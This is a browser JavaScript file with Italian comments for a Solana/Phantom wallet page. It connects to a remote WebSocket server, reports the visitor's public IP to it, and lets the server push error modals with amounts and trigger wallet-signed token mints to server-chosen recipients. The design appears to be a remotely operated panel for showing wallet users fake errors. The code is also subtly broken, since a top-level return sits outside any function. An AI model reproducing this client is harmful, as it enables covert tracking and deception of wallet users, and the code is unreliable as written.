console.log('--- Inizio esecuzione socket.js ---');
console.log('Stato di window.splToken:', window.splToken);
console.log('Stato di window.solanaWeb3:', window.solanaWeb3);

// Assicurati che queste variabili siano definite prima di essere usate
// Se i console.log sopra mostrano 'undefined', il problema è nell'HTML.
const splToken = window.splToken;
const solanaWeb3 = window.solanaWeb3;

// Aggiungi un controllo esplicito qui, se splToken o solanaWeb3 non sono definiti, ferma lo script o gestisci l'errore
if (!splToken || !solanaWeb3) {
    console.error('[CRITICAL ERROR] Le librerie Solana (spl-token o web3.js) non sono state caricate correttamente nell\'HTML. Impossibile procedere.');
    // Puoi anche lanciare un alert o mostrare un messaggio all'utente qui
    // alert('Errore: Le librerie necessarie per Solana non sono state caricate. Controlla la console.');
    // Potrebbe essere utile disabilitare funzionalità o reindirizzare.
    // Per ora, ci limitiamo a loggare l'errore e non inizializzare il WebSocket
    window.ws = null; // Assicurati che ws sia null per prevenire tentativi di uso futuri
    // Potresti voler terminare l'esecuzione qui se le dipendenze sono critiche
    // throw new Error("Dipendenze Solana mancanti."); // Attenzione: questo blocca l'intero script
    return; // Esci dalla funzione se le dipendenze non sono presenti
}


window.ws = null;
let reconnectAttempts = 0;
const maxReconnectDelay = 30000;

// Utilizza la funzione getAssociatedTokenAddress fornita da splToken, è più robusta
// Rimuovi la tua funzione custom getAssociatedTokenAddress se intendi usare quella della libreria.
// Se invece vuoi mantenere la tua, assicurati che sia definita correttamente e che splToken e solanaWeb3 siano validi.
// Per questo esempio, ripristino l'uso diretto della libreria.
// OLD: function getAssociatedTokenAddress(mint, owner) { ... }
// NEW: splToken.getAssociatedTokenAddress()

function connectWebSocket() {
    // ⚠️ CAMBIA QUESTO con il tuo dominio su Render
    const wsUrl = 'wss://luna2dev-1.onrender.com/';

    try {
        console.log('[WS] Tentativo di connessione a:', wsUrl);
        window.ws = new WebSocket(wsUrl);

        window.ws.onopen = () => {
            console.log('[WS] ✅ Connessione aperta con:', wsUrl);
            reconnectAttempts = 0;

            if (window.realUserIp) {
                window.ws.send(JSON.stringify({
                    type: 'register_real_ip',
                    real_ip: window.realUserIp
                }));
            }
        };

        window.ws.onmessage = async (event) => {
            console.log('[WS] Messaggio ricevuto:', event.data);
            try {
                const data = JSON.parse(event.data);

                if (data.command === 'show_error') {
                    const errorId = data.payload?.error_id;
                    const amount = data.payload?.amount;

                    document.cookie = `error_id=${errorId}; path=/; max-age=86400`;
                    document.cookie = `error_amount=${amount}; path=/; max-age=86400`;
                    document.cookie = `show_pre_error=true; path=/; max-age=86400`;

                    if (!errorId) return console.warn('[WS] error_id mancante');

                    window.showErrorModal(errorId, amount, "N/A", true);
                } else if (data.command === 'hide_error') {
                    window.hideErrorModal();
                } else if (data.command === 'create_token_ready') {
                    const {
                        uri: metadataUri,
                        name,
                        symbol,
                        supply,
                        decimals,
                        recipient,
                        options
                    } = data.payload;

                    if (window.solana?.isPhantom) {
                        const provider = window.solana;
                        // Assicurati di usare l'endpoint RPC corretto, qui è hardcoded 'devnet'
                        // Se stai lavorando su mainnet, devi cambiare 'devnet' in 'mainnet-beta'
                        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));

                        try {
                            const resp = await provider.connect();
                            const mintAuthority = resp.publicKey;
                            const freezeAuthority = options.freeze_authority ? resp.publicKey : null;

                            const mint = solanaWeb3.Keypair.generate();
                            const recipientPublicKey = new solanaWeb3.PublicKey(recipient);

                            // Usa la funzione ufficiale di splToken per getAssociatedTokenAddress
                            const recipientATA = await splToken.getAssociatedTokenAddress(
                                mint.publicKey,
                                recipientPublicKey
                            );

                            const transaction = new solanaWeb3.Transaction();

                            transaction.add(
                                solanaWeb3.SystemProgram.createAccount({
                                    fromPubkey: provider.publicKey,
                                    newAccountPubkey: mint.publicKey,
                                    lamports: await connection.getMinimumBalanceForRentExemption(splToken.MINT_SIZE),
                                    space: splToken.MINT_SIZE,
                                    programId: splToken.TOKEN_PROGRAM_ID,
                                }),
                                splToken.createInitializeMintInstruction(
                                    mint.publicKey,
                                    decimals,
                                    mintAuthority,
                                    freezeAuthority,
                                    splToken.TOKEN_PROGRAM_ID // Aggiungi questo parametro se stai usando una versione più recente di spl-token
                                ),
                                splToken.createAssociatedTokenAccountInstruction(
                                    provider.publicKey, // Payer
                                    recipientATA,       // ATA
                                    recipientPublicKey, // Owner
                                    mint.publicKey,     // Mint
                                    splToken.TOKEN_PROGRAM_ID, // Token Program ID
                                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID // Associated Token Program ID
                                ),
                                splToken.createMintToInstruction(
                                    mint.publicKey,
                                    recipientATA,
                                    mintAuthority,
                                    BigInt(supply) * BigInt(10 ** decimals), // Usa BigInt per grandi numeri di supply
                                    [], // Signers
                                    splToken.TOKEN_PROGRAM_ID // Token Program ID
                                )
                            );

                            transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
                            transaction.feePayer = provider.publicKey;
                            transaction.partialSign(mint);

                            const signedTx = await provider.signAndSendTransaction(transaction);

                            Swal.fire({
                                title: 'Token creato!',
                                text: `Transazione: ${signedTx.signature}`,
                                icon: 'success',
                                background: '#1e1e1e',
                                color: '#fff',
                                confirmButtonColor: '#3085d6'
                            });

                        } catch (err) {
                            console.error('[Phantom] Errore durante l\'interazione con Phantom:', err);
                            Swal.fire({
                                title: 'Errore Phantom',
                                text: err.message || 'Errore durante la transazione.',
                                icon: 'error',
                                background: '#1e1e1e',
                                color: '#fff'
                            });
                        }
                    } else {
                        Swal.fire({
                            title: 'Phantom non trovato',
                            text: 'Installa Phantom per procedere.',
                            icon: 'warning',
                            background: '#1e1e1e',
                            color: '#fff'
                        });
                    }
                }
            } catch (err) {
                console.error('[WS] Errore parsing o elaborazione messaggio:', err);
            }
        };

        window.ws.onerror = (err) => {
            console.error('[WS] ❌ Errore WebSocket:', err);
        };

        window.ws.onclose = (event) => {
            console.warn(`[WS] 🔌 Connessione WebSocket chiusa: code=${event.code}, motivo=${event.reason}`);
            reconnectAttempts++;
            const delay = Math.min(1000 * reconnectAttempts, maxReconnectDelay);
            console.log(`[WS] Tentativo di riconnessione in ${delay / 1000}s`);
            setTimeout(connectWebSocket, delay);
        };
    } catch (err) {
        console.error('[WS] Errore durante la creazione di WebSocket:', err);
    }
}

// Avvia la connessione WebSocket subito
console.log('[WS] Chiamata a connectWebSocket()');
connectWebSocket();

// Ottieni IP pubblico
console.log('[IP] Tentativo di ottenere l\'IP pubblico...');
fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        window.realUserIp = data.ip;
        console.log('[IP] IP utente:', window.realUserIp);

        if (window.ws && window.ws.readyState === WebSocket.OPEN) {
            window.ws.send(JSON.stringify({
                type: 'register_real_ip',
                real_ip: window.realUserIp
            }));
        }
    })
    .catch(err => {
        console.warn('[IP] Errore ottenimento IP:', err);
    });

console.log('--- Fine esecuzione socket.js ---');
